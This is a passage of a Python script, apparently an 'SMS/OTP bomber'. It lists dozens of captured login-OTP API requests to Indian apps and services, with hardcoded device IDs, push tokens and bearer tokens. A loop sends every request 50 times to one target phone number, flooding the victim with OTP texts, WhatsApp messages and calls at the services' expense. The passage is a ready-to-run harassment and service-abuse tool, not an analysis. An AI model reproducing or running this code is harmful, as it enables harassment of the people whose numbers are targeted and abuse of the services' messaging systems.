                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://api.carselonadaily.com/api/customer/v2/login",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": "auth",
                "host": "api.carselonadaily.com"
            },
            "data": {
                "phone": number,
                "otpType": 0
            }
        },
        {
            "method": "POST",
            "url": "https://api.oyela.in/auth/generate_sms_otp",
            "headers": {
                "Host": "api.oyela.in",
                "accept": "application/json, text/plain, */*",
                "authorization": "",
                "clientdata": json.dumps({"platform": "mobile", "device_type": "android", "channel": "oyela-app", "app_version": "1.5.1"}),
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "phone": "+91"+number,
                "provider": "provider_3"
            }
        },
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        {
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "method": "POST",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "phone": number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone": "+91"+number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge?resend=true",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone":"+91"+ number
            }
        },
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "initiatePhoneOTP",
                    "phoneNumber": f"91{number}"
                }
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "resendOTP",
                    "phoneNumber": f"91{number}",
                    "userID": "",
                    "resendOTPCommunicationType": "whatsapp"
                }
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://user-onboarding-api-live.utec-build.com/userOnboardingService/generateOtp",
            "headers": {
                "Keep-Alive": "timeout=90, max=99",
                "Cache-Control": "no-cache",
                "Accept": "application/json",
                "App-Version": "V4",
                "Service-Session-Identifier": "256DF272EEBF45B9B06CC0D69D02907B_1716346615006",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "user-onboarding-api-live.utec-build.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "39"
            },
            "data": {
                "appId": 1,
                "mobileNumber": number
            }
        },
        {
            "method": "POST",
            "url": "https://v1.pro.rechargecube.in/auth/login/otp",
            "headers": {
                "Host": "v1.pro.rechargecube.in",
                "authorization": "",
                "content-type": "application/json",
                "content-length": "23",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.dream11.com/auth/passwordless/init",
            "headers": {
                "Host": "www.dream11.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "85",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "phoneNumber": number,
                "templateName": "default",
                "channel": "sms",
                "flow": "SIGNIN"
            }
        },
        {
            "method": "POST",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "headers": {
                "Host": "production.apna.co",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "retries": 0.0,
                "phone_number": f"91{number}",
                "source": "employer",
                "hash_type": "employer"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714759344812",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "35",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "mobile": f"+91{number}",
                "type": 1
            }
        },
        {
            "method": "POST",
            "url": "https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb",
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "Content-Length": "24",
                "Host": "clicktobuy.hyundai.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": {
                "cstmMob": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
            "headers": {
                "Host": "www.rummycircle.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "otpOnCall": True,
                "mobile": number,
                "otpType": 8.0,
                "transactionId": 1.708139023656E12
            }
        },
        {
            "method": "POST",
            "url": "https://shop.havells.com/graphql",
            "headers": {
                "Host": "shop.havells.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "191",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "variables": {
                    "mobile": number
                },
                "query": """mutation sendOtp($mobile: String!) {
  sendOtp(mobile: $mobile) {
    mobile
    message
    __typename
  }
}""",
                "operationName": "sendOtp"
            }
        },
        {
            "method": "POST",
            "url": "https://micro.banksathi.com/api/v1/auth_user/initinate_otp",
            "headers": {
                "Host": "micro.banksathi.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "92",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "device_id": "",
                "whatsaap_consent": False,
                "mobile_no": number,
                "condition_accepted": True
            }
        },
        {
            "method": "POST",
            "url": "https://gateway.credmudra.com/public/send-otp",
            "data": {
                "data": {
                    "contactNo": number,
                    "resend": False,
                    "anonymousId": "65d48590cbf0720f6eec2505"
                }
            },
            "headers": {
                "Host": "gateway.credmudra.com",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://api.prod.oziva.in/nitro/send/",
            "data": {
                "phone": number,
                "source": "order_management",
                "type": "sms"
            },
            "headers": {
                "Host": "api.prod.oziva.in",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "data": {
                "mobile": number,
                "type": 3
            },
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714835211967",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en_US",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.8.0"
            }
        },
        {
            "method": "POST",
            "url": "https://www.vidyakul.com/api/v1/login",
            "data": {
                "phone_number": number,
                "version_number": "6.0.5.9",
                "fcm_token": "fWSFkvMaQoi_btSsaHlMd2:APA91bE_AXYYAutauBN_fegTv7CiMWw0z2zylXgyq9792ra7ou4VfTJ3nI4gPFpla1AEIN_rtmgwqk9rL5DoldqjcmKdJeGIGDI6_p-rhE9xVLqCjVFaTE9tanuuccEhsuUTHhGkNVzl"
            },
            "headers": {
                "Host": "www.vidyakul.com",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjIyMDUxOSwiaXNzIjoiaHR0cDovL3d3dy52aWR5YWt1bC5jb20vYXBpL3YxL2xvZ2luIiwiaWF0IjoxNzE0NzQ0OTIxLCJleHAiOjE3MTczMzY5MjEsIm5iZiI6MTcxNDc0NDkyMSwianRpIjoiNEJsbFZZSFdpRnhPc1poRyJ9.xQSAIQdB4YeEgtbOa61WQj4MhzXxge5Cea3jzPEfRbc",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.3"
            }
        },
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://api.carselonadaily.com/api/customer/v2/login",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": "auth",
                "host": "api.carselonadaily.com"
            },
            "data": {
                "phone": number,
                "otpType": 0
            }
        },
        {
            "method": "POST",
            "url": "https://api.oyela.in/auth/generate_sms_otp",
            "headers": {
                "Host": "api.oyela.in",
                "accept": "application/json, text/plain, */*",
                "authorization": "",
                "clientdata": json.dumps({"platform": "mobile", "device_type": "android", "channel": "oyela-app", "app_version": "1.5.1"}),
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "phone": "+91"+number,
                "provider": "provider_3"
            }
        },
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        {
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "method": "POST",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "phone": number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone": "+91"+number
            }
        },
        {
            "url": "https://api.hav-g.in/v2/auth/challenge?resend=true",
            "method": "POST",
            "headers": {
                "Host": "api.hav-g.in",
                "accept": "application/json, text/plain, */*",
                "source": "APP",
                "content-type": "application/json",
                "content-length": "25",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.11.0"
            },
            "data": {
                "phone":"+91"+ number
            }
        },
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "initiatePhoneOTP",
                    "phoneNumber": f"91{number}"
                }
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "resendOTP",
                    "phoneNumber": f"91{number}",
                    "userID": "",
                    "resendOTPCommunicationType": "whatsapp"
                }
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0",
            "headers": {
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "tradws.stocknote.com",
                "Connection": "Keep-Alive",
                "Content-Length": "258"
            },
            "data": {
                "request": {
                    "appID": "9218fd7787cf85cc9f58a7c3482a93bc",
                    "formFactor": "M",
                    "requestType": "U",
                    "response_format": "json",
                    "data": {
                        "mobile": number,
                        "remote_add": "0.0.0.0",
                        "user_agent": "StockNote -42041,Android,Google,Android 14,CFNetwork 808.3,Darwin 16.3.0"
                    }
                }
            }
        },
        {
            "method": "POST",
            "url": "https://jarvis.divinetalk.live/api/v7/sendOtp",
            "headers": {
                "User-Agent": "Dart/3.4 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "mobile_no": number
            }
        },
        {
            "method": "POST",
            "url": "https://web-backend.biryanibykilo.com/backend-app/authentication/api/v2/send_otp",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJpc19ndWVzdCI6dHJ1ZSwidHMiOiIyMDI0LTA1LTAzIDA0OjM0OjU4Iiwic291cmNlIjoiYXBwIiwicmVmcmVzaF90cyI6IjIwMjQtMDUtMTMgMDQ6MzQ6NTgifQ.WCluN6-GDSQbK4C7cifxTALUf2gEqe03AuJMld4lDuE",
                "platform": "android",
                "appversion": "19.0.0",
                "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "client-id": "bbk",
                "Content-Type": "application/json",
                "Content-Length": "329",
                "Host": "web-backend.biryanibykilo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": number,
                "device_type": "app",
                "is_signup": False,
                "login_id": "",
                "firebase_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "retry": False
            }
        },
        {
            "method": "POST",
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "14ded413-164b-411e-99eb-7ff33ae4ad49",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number,
                "organizationId": "64254d66be2a390018e6d348"
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "firstName": "shiva",
                "lastName": "",
                "mobile": number,
                "countryCode": "+91"
            }
        },
        {
            "method": "POST",
            "url": "https://api.hogr.app/api/apigateway?api=generateotp",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "host": "api.hogr.app",
                "Content-Length": "225"
            },
            "data": {
                "phone": f"+91{number}",
                "can_whatsapp_messages": True,
                "pk": "f6mx-A0_SGK_UxnbwVi2kN:APA91bEgFLmpvykAXsU0owL35Uzjogpl6WLxU53GY2X0VLxuA-FQ5W5lO7dmRUaX2tnwTRFELrGPuDfMGsqFLoqUNeyzaQKi7ka2GiXxQ-yytVRe6vEq0yyQdb-3uPBRF_0NjzGfl0B6"
            }
        }
        
    ]
    
    # Run the requests for 20 times
    for _ in range(50):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
        #    print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        #time.sleep(1)

# Example usage:
#smsgii("9336734442")  # Replace "9336734442" with the phone number you want to use
